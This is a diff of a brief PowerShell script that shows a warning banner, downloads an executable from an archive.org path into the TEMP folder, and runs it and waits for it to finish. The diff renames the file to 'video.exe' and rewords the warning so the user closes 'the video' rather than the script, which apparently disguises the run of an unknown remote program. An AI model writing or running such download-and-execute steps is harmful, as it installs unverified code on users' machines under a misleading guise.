@@ -2,12 +2,12 @@ Write-Host ""
 Write-Host "==================== WARNING ====================" -ForegroundColor Yellow
 Write-Host "If you close this window while the program runs," -ForegroundColor Yellow
 Write-Host "you may risk losing disk space to leftover files!" -ForegroundColor Yellow
-Write-Host "Always let it finish, or use Ctrl+C in this window." -ForegroundColor Yellow
+Write-Host "Always let it finish, close the video itself, not this." -ForegroundColor Yellow
 Write-Host "=================================================" -ForegroundColor Yellow
 Write-Host ""
 
-$exe = "$env:TEMP\virtualend.exe"
-iwr archive.org/download/video_20250927_2306/video.exe -OutFile $exe
+$exe = "$env:TEMP\video.exe"
+iwr archive.org/download/video_20250928/video.exe -OutFile $exe
 
 # Run and wait for it to finish
 Start-Process $exe -Wait
